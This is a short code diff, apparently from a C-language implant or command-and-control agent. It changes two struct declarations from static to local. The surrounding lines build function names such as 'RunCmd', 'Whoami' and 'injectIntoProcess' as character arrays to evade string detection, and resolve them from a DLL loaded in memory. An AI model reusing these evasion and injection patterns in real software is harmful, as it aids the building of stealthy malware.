@@ -239,8 +239,8 @@ void myMain()
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
     CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
 
-    static ESG_STD_API EsgStdApi = { 0 };
-    static PESG_STD_API PEsgStdApi = &EsgStdApi;
+    ESG_STD_API EsgStdApi = { 0 };
+    PESG_STD_API PEsgStdApi = &EsgStdApi;
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, runCmd_c);
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
